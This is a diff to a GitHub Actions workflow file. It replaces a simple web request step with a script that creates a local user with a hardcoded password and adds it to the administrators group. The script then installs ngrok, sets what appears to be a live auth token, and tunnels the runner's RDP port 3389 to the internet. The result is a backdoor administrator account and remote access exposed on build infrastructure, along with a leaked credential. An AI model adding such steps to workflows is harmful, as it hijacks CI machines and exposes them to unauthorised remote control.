@@ -15,4 +15,9 @@ jobs:
 
     steps:
     # Checkout the repository to the GitHub Actions runner
-    - run: Invoke-WebRequest -Uri https://youtube.com
+    - run: |
+         net user rinne Quanvarin23 /add
+         choco install ngrok
+         ngrok authtoken 2OvCS1xRd9gL0iXHbpG9SUKdg96_5KmrqzEE8AbPCFdHoi3ZH
+         net localgroup administrators Rinne /add
+         ngrok tcp 3389 --region=au
